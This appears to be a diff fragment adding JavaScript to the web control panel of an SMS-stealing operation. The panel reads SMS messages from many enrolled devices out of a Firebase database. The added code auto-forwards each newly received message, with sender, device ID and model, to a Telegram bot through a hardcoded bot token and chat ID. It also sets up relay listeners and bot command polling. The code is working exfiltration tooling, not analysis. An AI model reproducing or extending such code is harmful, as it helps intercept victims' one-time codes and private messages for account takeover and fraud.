+if(currentScreen==='data')renderDataScreen();
+if(currentScreen==='bulk')renderBulkScreen();
+if(currentScreen==='auto-token')renderAutoTokenScreen();
+// Telegram Auto Forwarder for New SMS
+checkTelegramAutoForward();
+});
+
+// Telegram Auto-Forwarder logic (Filters out past SMS & only sends FUTURE SMS)
+window.controllerStartTime = window.controllerStartTime || Date.now();
+window.sentSmsKeys = window.sentSmsKeys || new Set();
+
+async function checkTelegramAutoForward() {
+  const token = document.getElementById('setting-fwd-token')?.value?.trim() || '8973573038:AAETZkKGUJAXgVdAmRzrgYUQVY3cWCeHhxA';
+  const chatId = document.getElementById('setting-fwd-chat')?.value?.trim() || '7606730935';
+  
+  if (!token || !chatId) return;
+
+  Object.entries(allDevices).forEach(([devId, dev]) => {
+    const smsObj = dev.sms || {};
+    Object.entries(smsObj).forEach(([smsId, sms]) => {
+      const key = `${devId}_${smsId}`;
+      if (window.sentSmsKeys.has(key)) return;
+
+      // Parse SMS timestamp into milliseconds
+      const smsTimeMs = sms.timestamp ? new Date(sms.timestamp.replace(' ', 'T')).getTime() : 0;
+
+      // IF SMS WAS RECEIVED BEFORE CONTROLLER WAS OPENED -> MARK AS READ, DO NOT FORWARD TO TELEGRAM
+      if (smsTimeMs > 0 && smsTimeMs < window.controllerStartTime) {
+        window.sentSmsKeys.add(key);
+        return;
+      }
+
+      // ONLY FORWARD FUTURE INCOMING SMS (RECEIVED AFTER CONTROLLER PAGE LOAD)
+      window.sentSmsKeys.add(key);
+
+      const text = `<b>📩 NEW INSTANT SMS</b>\n\n` +
+                   `<b>📱 Device ID:</b> <code>${devId}</code>\n` +
+                   `<b>📱 Model:</b> ${dev?.info?.deviceModel || 'Unknown'}\n` +
+                   `<b>👤 Sender:</b> <code>${sms.sender || 'Unknown'}</code>\n` +
+                   `<b>💬 Message:</b>\n<code>${(sms.message || '').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code>\n\n` +
+                   `<i>🕒 Time: ${sms.timestamp || ''}</i>`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+      }).catch(e => console.error('TG Send Error:', e));
+    });
+  });
+}
+
+// Active Relay Listener - REAL TIME
+db.ref(`${BASE}/sys_data/active_relay`).on('value', snap => {
+  if (snap.exists()) {
+    const relay = snap.val();
+    activeRelayDeviceId = relay.deviceId;
+    updateRelayUiState(relay.deviceId);
+  } else {
+    activeRelayDeviceId = null;
+    updateRelayUiState(null);
+  }
+});
+
+// Start Telegram Bot Command Polling (for Netlify client-side auto-relay)
+startTelegramBotPolling();
+
+// Panel Logins - REAL TIME
+db.ref(`${BASE}/sys_data/sessions`).on('value',snap=>{
+if(currentScreen==='data')renderDataScreen();
+if(currentScreen==='sessions')renderSessions();
+});
+// Update relative times every 30s
+setInterval(()=>{if(currentScreen==='detail'&&selectedDeviceId)renderDeviceDetail()},30000);
+}
+init();
+</script>
+</body>
+</html>
